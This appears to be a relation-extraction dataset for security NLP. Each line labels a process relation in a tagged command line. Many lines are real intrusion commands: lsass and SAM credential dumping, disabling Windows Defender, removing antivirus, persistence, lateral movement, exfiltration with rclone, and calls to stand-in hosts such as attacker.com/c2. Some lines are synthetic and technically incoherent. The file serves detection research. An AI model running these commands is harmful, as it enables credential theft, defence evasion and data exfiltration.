+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 C:\ProgramData\updater.exe
+process-process-fork(e1,e2)	"<e1>PsExec.exe</e1> /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e2>cmd</e2> /c COPY ""\\REDACTED\share$\ds.exe"" %WINDIR%\temp"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>cmd.exe</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""TSUserEnabled"" /d 0 /f"
+process-file-unlink(e1,e2)	python.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
+process-file-read(e1,e2)	"<e1>reg</e1> query <e2>hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</e2> /v ""DisplayName"" /s"
+process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> /v DisableAntiSpyware /t REG\_DWORD /d 1 /f"
+process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft && mkdir <e2>Network</e2>
+Other	C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 <e1>c:\programdata\lsass.zip</e1> <e2>c:\programdata\lsass.dmp</e2>
+process-socket-send(e1,e2)	<e1>portfwd</e1> add -R -p 89474 -l 4453 -L <e2>192.169.6.122</e2>
+process-file-read(e1,e2)	"<e1>python_17.exe</e1> -c <e2>""open('C:\\temp\\pw_17.txt').read()""</e2>"
+process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c %USERPROFILE%\AppData\bigfile.exe -i -c <e2>%USERPROFILE%\AppData\1.bat</e2>
+process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>192.168.1.100:8080</e2> -Method POST
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>del</e2> /tmp/malware.sh
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> runas /user:admin <e2>powershell.exe</e2>
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h C:\ProgramData\updater.exe
+process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
+process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
+process-file-unlink(e1,e2)	rundll32.exe <e1>rm</e1> <e2>/tmp/malware.sh</e2>
+process-file-write(e1,e2)	<e1>certutil_76.exe</e1> -encode input_76.txt <e2>C:\temp\encoded_76.txt</e2>
+process-process-inject(e1,e2)	powershell.exe <e1>dllinjector.exe</e1> -p <e2>notepad.exe</e2> -d payload.dll
+process-file-read(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save <e2>hklm\sam</e2> c:\ProgramData\sam.save"" /f"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>rm</e2> C:\ProgramData\updater.exe
+process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
+process-file-read(e1,e2)	<e1>notepad_49.exe</e1> <e2>C:\Users\admin\notes_49.txt</e2>
+process-socket-send(e1,e2)	powershell.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
+process-process-fork(e1,e2)	<e1>cmd_51.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_51.bat
+process-process-unlink(e1,e2)	powershell.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
+process-file-unlink(e1,e2)	cmd.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri 10.10.10.10:4444 -Body 'cmd=whoami'"""
+process-file-chmod(e1,e2)	wmic.exe <e1>icacls</e1> <e2>C:\Windows\Temp\evil.dll</e2> /grant Everyone:F
+process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
+process-file-write(e1,e2)	<e1>nuclei</e1> -l sept24.txt -o <e2>sept24_op.txt</e2> -s medium
+process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>notepad.exe</e2>
+process-file-write(e1,e2)	cmd_51.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_51.bat</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>powershell.exe</e2>
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>reg.exe</e2> save hklm\sam c:\ProgramData\sam.hive
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableOnAccessProtection"" /t REG\_DWORD /d ""1"" /f"
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
+process-file-chmod(e1,e2)	python.exe <e1>icacls</e1> <e2>/var/tmp/hide.so</e2> /grant Everyone:F
+process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> nbproc > <e2>\\.\pipe\nbproc</e2>
+process-file-exec(e1,e2)	<e1>svchost.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
+process-file-write(e1,e2)	<e1>notepad_70.exe</e1> <e2>C:\Users\test\notes_70.txt</e2>
+process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
+process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\system</e2> c:\users\REDACTED\appdata\local\temp\1\mkffdg
+process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Sophos System Protection""</e2> call uninstall /nointeractive"
+process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee SiteAdvisor Enterprise"" call uninstall /nointeractive"
+process-file-read(e1,e2)	<e1>ftp_87.exe</e1> <e2>-s:script_87.txt</e2> C:\inetpub\wwwroot\ftp_87.log
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
+process-file-write(e1,e2)	cmd_45.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_45.txt</e2>
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM notepad.exe /F
+process-file-exec(e1,e2)	<e1>rundll32_50.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
+process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
+process-file-unlink(e1,e2)	rundll32.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
+process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>C:\ProgramData\updater.exe""</e2>"
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 192.168.1.100:8080
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
+process-process-unlink(e1,e2)	cmd.exe <e1>taskkill</e1> /IM <e2>winlogon.exe</e2> /F
+process-file-unlink(e1,e2)	wmic.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
+process-process-inject(e1,e2)	<e1>python.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
+process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>C:\Users\REDACTED\AppData\Local\Notepad\upedge.bat</e2> /sc MINUTE /mo 720 /F"
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine""</e2> /v ""MpEnablePus"" /t REG\_DWORD /d ""0"" /f"
+process-process-fork(e1,e2)	%WINDIR%\system32\cmd.exe /c <e1>net</e1> localgroup administrators <e2>sqlbackup</e2> /add
+process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>notepad.exe</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>dir</e2> *.dll
+process-file-read(e1,e2)	torify <e1>nuclei</e1> -l <e2>large_scope</e2> -o large_scope -as
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>net</e2> view \\DOMAINCONTROLLER /all
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>nc</e2> -lvp 4444 -s https://evil.server/payload
+process-file-read(e1,e2)	<e1>certutil_22.exe</e1> -urlcache -split -f http://malicious.site/data_22.enc <e2>C:\Temp\temp_22.enc</e2>
+process-file-write(e1,e2)	<e1>notepad_58.exe</e1> <e2>C:\Users\test\notes_58.txt</e2>
+process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>http://attacker.com/c2</e2> -Method POST
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>taskkill</e2> /IM winlogon.exe /F
+process-socket-receive(e1,e2)	<e1>certutil_95.exe</e1> -urlcache -split -f <e2>http://malicious.site/data_95.enc</e2> C:\Temp\temp_95.enc
+process-file-read(e1,e2)	<e1>adfind.exe</e1> -gcb -sc <e2>trustdmp</e2>
+process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""(objectcategory=group)"" > <e2>ad_group.txt</e2>"
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>fsutil</e2> behavior set SymlinkEvaluation R2L:1
+process-file-write(e1,e2)	"<e1>powershell_4.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_4.txt</e2> -Value 'infected'"""
+process-process-fork(e1,e2)	"<e1>cmd.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri https://evil.server/payload -Body 'cmd=whoami'"""
+process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name=""DCOM"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=rpcss action=allow protocol=TCP localport=135 > <e2>C:\Windows\Temp\VlPWyecW.tmp</e2> 2>&1"
+process-file-read(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p lsass.exe -d <e2>payload.dll</e2>
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
+process-socket-send(e1,e2)	<e1>mstsc.exe</e1> <e2>/v:IP_ADDRESS_1</e2>
+process-socket-receive(e1,e2)	cmd.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
+process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
+Other	"C:\Windows\system32\cmd.exe /C cool.exe <e1>[DC IP ADDRESS]</e1> [DOMAIN NAME] Administrator -c ""taskkill /f /im <e2>explorer.exe""</e2>"
+process-process-fork(e1,e2)	"<e1>cmd</e1> /v /c <e2>net</e2> group /domain ""Domain Admins"" > ""%TEMP%\51362.txt"" 2>&1"
+process-process-fork(e1,e2)	"<e1>psexec.exe</e1> \\[TARGET IP] -u [DOMAIN]\[USER] -p ""[PASSWORD]"" -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\p.bat</e2>"
+process-process-fork(e1,e2)	<e1>cmd_57.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_57.bat
+process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2> WDAGUtilityAccount2 /add
+process-file-write(e1,e2)	"<e1>C:\Windows\system32\reg.exe</e1> ADD ""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"" /f /t REG_DWORD /v <e2>""C:\ProgramData\Microsoft\Oweboiqnb""</e2> /d ""0"""
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> C:\ProgramData\updater.exe
+process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C WMIC/node:""DC.DOMAIN.local"" process call create ""cmd /c <e2>C:\PerfLogs\servisess.exe""</e2>"
+process-file-unlink(e1,e2)	svchost.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
+process-process-fork(e1,e2)	python.exe <e1>powershell</e1> Start-Process <e2>svchost.exe</e2>
+process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>MSExchangeEdgeSync</e2>
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /v fDenyTSConnections /t REG_DWORD /d 0"
+process-file-read(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y ""\\REDACTED\share$\ds.exe"" <e2>""%PUBLIC%\Music""</e2>"
+process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\users\REDACTED\appdata\local\notepad\UpdateEdge.bat</e2> /SC ONSTART /F"
+process-file-read(e1,e2)	"<e1>esentutl.exe</e1> /r V01 <e2>/l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2> /s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" /d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"""
+process-file-read(e1,e2)	"<e1>cmd</e1> /c COPY /Y <e2>""\\REDACTED\share$\ds.exe""</e2> ""%PUBLIC%\Music"""
+process-file-exec(e1,e2)	"cmd.exe /Q /c <e1>schtasks.exe</e1> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr <e2>""%%programdata%%\schcache\mswow86.exe</e2>"
+process-process-inject(e1,e2)	<e1>wmic.exe</e1> dllinjector.exe -p <e2>notepad.exe</e2> -d payload.dll
+process-file-read(e1,e2)	<e1>ftp_41.exe</e1> <e2>-s:script_41.txt</e2> C:\inetpub\wwwroot\ftp_41.log
+process-file-read(e1,e2)	%WINDIR%\system32\cmd.exe /C <e1>net</e1> usre <e2>REDACTED</e2> /dom
+process-socket-receive(e1,e2)	python.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
+process-file-unlink(e1,e2)	"<e1>reg</e1> delete <e2>""HKLM\Software\Policies\Microsoft\Windows Defender""</e2> /f"
+process-process-unlink(e1,e2)	cmd.exe <e1>taskkill</e1> /IM <e2>taskmgr.exe</e2> /F
+process-file-read(e1,e2)	rundll32.exe <e1>dllinjector.exe</e1> -p taskmgr.exe -d <e2>payload.dll</e2>
+process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee VirusScan Enterprise"" call uninstall /nointeractive"
+process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>DEL</e2> %USERPROFILE%\AppData\bigfile.txt
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> /var/tmp/hide.so
+process-file-read(e1,e2)	<e1>adfind.exe</e1> -f objectcategory=computer -csv name operatingSystem > <e2>ad_computers_enum.txt</e2>
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
+process-process-fork(e1,e2)	<e1>torify</e1> <e2>sqlmap</e2> -u https://<domain>.gov.bd/admin/manage_user.php?id=1 -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast --parse-errors --dbs
+Other	"<e1>schtasks.exe</e1> /Create /RU ""NT AUTHORITY\SYSTEM"" /tn juqpxmakfk /tr ""regsvr32.exe -s <e2>C:\Users\REDACTED\ocrafh.html</e2>"" /SC ONCE /Z /ST 14:20 /ET 14:32"
+process-file-read(e1,e2)	<e1>restic.exe</e1> -r rest:http://195.123.226.84:8000/ init --password-file <e2>ppp.txt</e2>
+process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
+process-file-unlink(e1,e2)	svchost.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
+process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>echo</e1> 0291f1e69dd > <e2>\\.\pipe\82afc1</e2>
+process-file-read(e1,e2)	<e1>WMIC</e1> /Node:localhost <e2>/Namespace:\\root\SecurityCenter2</e2> Path AntiVirusProduct Get displayName /Format:List
+process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\Perflogs\434.bat</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -gcb -sc trustdmp > trustdmp.txt
+process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>QQPCTray.exe</e2>
+process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c whoami 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
+process-process-fork(e1,e2)	<e1>python.exe</e1> runas /user:admin <e2>python.exe</e2>
+process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>config.json</e2>
+Other	<e1>ping</e1> -n 1 <REDACTED>shell wmic <e2>/node:<REDACTED></e2> process get executablepath
+process-process-fork(e1,e2)	"<e1>c:\windows\system32\cmd.exe</e1> /c <e2>wmic</e2> /node:""<REDACTED>"" process call create ""c:\perflogs\setup1.exe"""
+process-file-exec(e1,e2)	<e1>c:\windows\system32\windowspowershell\v1.0\powershell.exe</e1> -exec bypass <e2>.\adrecon.ps1</e2>
+process-process-fork(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>cmd</e1> /c <e2>vssadmin</e2> create shadow /for=C: 2>&1
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>nltest</e2> /domain_trusts /all_trusts
+process-file-chmod(e1,e2)	cmd.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
+process-socket-receive(e1,e2)	python.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
+process-file-write(e1,e2)	<e1>cmd.exe</e1> /c bitsadmin /transfer update_service \\REDACTED\share$\ds.exe <e2>%APPDATA%\ds.exe</e2> & %APPDATA%\ds.exe -pass REDACTED
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>route</e2> print
+process-process-fork(e1,e2)	<e1>psexec.exe</e1> -accepteula -d -s \\<INTERNAL_IP> <e2>rundll32.exe</e2> C:\windows\192145.dll,StartW
+process-socket-send(e1,e2)	<e1>powershell.exe</e1> Invoke-WebRequest -Uri <e2>http://attacker.com/c2</e2> -Method POST
+process-file-read(e1,e2)	"PsExec.exe /accepteula -d \\REDACTED -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY /Y <e2>""\\REDACTED\share$\ds.exe""</e2> ""%PUBLIC%\Music"""
+process-file-read(e1,e2)	<e1>cmd.exe</e1> /c copy <e2>\\REDACTED\c\windows\temp\p.bat</e2> c:\windows\temp\
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>rm</e2> C:\Windows\Temp\evil.dll
+process-file-read(e1,e2)	<e1>powershell_74.exe</e1> Get-Content <e2>C:\Users\Public\secrets_74.txt</e2>
+process-file-write(e1,e2)	<e1>powershell.exe</e1> Set-ItemProperty -Force -Path <e2>'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest'</e2> -Name 'UseLogonCredential' -Value '1'
+process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableIOAVProtection"" /t REG\_DWORD /d ""1"" /f"
+process-file-read(e1,e2)	"<e1>powershell_64.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_64.yaml""</e2>"
+process-file-exec(e1,e2)	"<e1>powershell.exe</e1> -Command ""Start-Process <e2>C:\Windows\Temp\evil.dll""</e2>"
+process-file-exec(e1,e2)	<e1>invokemodule</e1> -module locker -locker <REDACTED>.dll -lockerpath <e2>programdata\microsoft</e2> -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
+process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>powershell</e2> Start-Process svchost.exe
+process-file-exec(e1,e2)	<e1>cmd.exe</e1> -c <e2>\\<domain controller>\netlogon\<num>.exe</e2> --access-token <token>
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>attrib</e2> +S +H %appdata%\Microsoft\Network\Packages.txt
+process-file-read(e1,e2)	<e1>wmic_92.exe</e1> process get commandline < <e2>C:\cmd\proc_92.txt</e2>
+process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -f ""(objectcategory=organizationalUnit)"" > ad_ous.txt"
+process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy <e2>""\\SERVER.domain.name\path""</e2> mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6"
+process-file-read(e1,e2)	<e1>cmd.exe</e1> /c bitsadmin /transfer update_service <e2>\\REDACTED\share$\ds.exe</e2> %APPDATA%\ds.exe & %APPDATA%\ds.exe -pass REDACTED
+Other	<e1>cmd.exe</e1> /C wmic <e2>/node:<remote host></e2> process get executablepath
+process-file-read(e1,e2)	cmd.exe /Q /c <e1>expand</e1> <e2>cache.cab</e2> -F:* c:\programdata
+process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e1> --source=anchorDNS_x64.exe <e2>--target=anchor_x64.exe</e2> --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
+process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
+process-file-write(e1,e2)	<e1>procdump64.exe</e1> -ma lsass.exe <e2>lsass.dmp</e2>
+process-file-write(e1,e2)	cmd.exe /C <e1>net</e1> view /all >> <e2>C:\Users\<REDACTED>\AppData\Local\Temp\BD2C.bin1</e2>
+process-process-fork(e1,e2)	"<e1>REG</e1> ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""microsoft update"" /t REG_SZ /F /D <e2>""SCHTASKS</e2> /run /tn 9T6ukfi6"""
+process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C af.exe -subnets -f (objectCategory=subnet) > <e2>subnets.txt</e2>
+process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
+process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C where /r <e2>C:\Windows\WinSxS\</e2> *Microsoft.ActiveDirectory.Management.dll*
+process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
+process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c start <e2>rundll32</e2> namr.dll,IternalJob
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 10.10.10.10:4444
+process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>cmd</e2> /c vssadmin create shadow /for=C: 2>&1
+process-file-write(e1,e2)	<e1>mshta_64.exe</e1> -write <e2>C:\Users\Public\hta_payload_64.hta</e2>
+process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>python3</e2> -m http.server 8080 --bind http://attacker.com/c2
+process-file-chmod(e1,e2)	svchost.exe <e1>icacls</e1> <e2>C:\Windows\Temp\evil.dll</e2> /grant Everyone:F
+process-file-read(e1,e2)	<e1>qq.exe</e1> -sc <e2>trustdmp</e2>
+process-file-read(e1,e2)	<e1>powershell</e1> Expand-Archive <e2>python-3.10.4-embed-amd64.zip</e2> -DestinationPath %appdata%\Microsoft\Network
+process-process-fork(e1,e2)	"<e1>reg</e1> add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d <e2>""cmd.exe</e2> /c C:\<REDACTED-COMPANY-NAME>.exe"" /f"
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>svchost.exe</e2>
+process-file-read(e1,e2)	"<e1>C:\Windows\system32\net1</e1> group <e2>""domain admins""</e2> /dom"
+process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""select @@version"""
+process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>explorer.exe</e2>
+process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>HideAll.bat</e2>
+Other	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do <e1>ping</e1> -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\servers_live.txt</e2>
+process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
+process-file-exec(e1,e2)	<e1>rundll32</e1> <e2>C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,1</e2>
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
+process-file-read(e1,e2)	<e1>powershell_42.exe</e1> Get-Content <e2>C:\Users\Public\secrets_42.txt</e2>
+process-file-read(e1,e2)	"cmd /v /c <e1>net</e1> group /domain <e2>""Domain Admins""</e2> > ""%TEMP%\51362.txt"" 2>&1"
+process-file-unlink(e1,e2)	rundll32.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
+process-process-inject(e1,e2)	<e1>cmd.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
+Other	c:\windows\system\procdump.exe -accepteula -ma <e1>lsass.exe</e1> <e2>lsass.dmp</e2>
+process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>cmdkey</e2> /list 1> \\127.0.0.1\ADMIN$\__REDACTED 2>&1
+process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
+process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h /var/tmp/hide.so
+process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
+process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>lsass.exe</e2> -Force
+process-file-read(e1,e2)	<e1>adfind.exe</e1> -gcb -sc <e2>trustdmp</e2>
+process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> Stop-Process -Name <e2>explorer.exe</e2> -Force
+process-file-write(e1,e2)	<e1>cmd.exe</e1> /c copy \\SOURCE_SERVER_IP\c\windows\temp\k.exe <e2>c:\windows\temp\</e2>
+process-file-write(e1,e2)	"<e1>powershell_81.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_81.ps1',</e2> 'Invoke-Mimikatz')"""
+process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableBehaviorMonitoring"" /t REG\_DWORD /d ""1"" /f"
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>del</e2> /tmp/malware.sh
+process-file-write(e1,e2)	"<e1>python_59.exe</e1> -c <e2>'""open(C:\\Users\\admin\\payload_59.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
+process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>cmd.exe</e2>
+process-process-fork(e1,e2)	<e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>ad_trustdmp.txt</e2>
